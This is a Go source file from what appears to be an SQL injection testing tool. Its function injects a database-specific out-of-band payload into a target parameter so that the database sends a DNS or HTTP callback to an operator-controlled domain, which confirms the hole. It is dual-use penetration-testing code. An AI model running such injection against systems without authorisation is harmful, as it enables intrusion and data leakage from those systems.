package techniques

import (
	"context"

	"github.com/0xseif-code/vexor/internal/sqli/dbms"
)

// OOB fires a payload that causes the DBMS to make an out-of-band request
// (DNS/HTTP) to the operator's domain. Confirmation happens externally on the
// listener; the engine only generates and dispatches the payload.
func (r *Runner) OOB(ctx context.Context, psets []*dbms.Payloads) *Result {
	if r.Cfg.OOBDomain == "" {
		return nil
	}
	if ctx.Err() != nil {
		return nil
	}
	domain := r.Cfg.OOBDomain
	unc := "vx"
	for _, p := range psets {
		if len(p.OOB) == 0 {
			continue
		}
		logTesting(familyTitle(p, TechOOB, "out-of-band (DNS/HTTP)"))
		payload := dbms.Expand(p.OOB[0], dbms.Macros{
			Orig: r.Point.Value, Domain: domain, Unc: unc,
		})
		if _, ok := r.once(ctx, r.Point.Render(payload)); !ok {
			continue
		}
		return &Result{
			Technique:  TechOOB,
			DB:         p.Name,
			Payload:    payload,
			Title:      familyTitle(p, TechOOB, "out-of-band (DNS/HTTP)"),
			Evidence:   "OOB payload dispatched; confirm the callback on " + domain,
			Confidence: 60,
		}
	}
	return nil
}
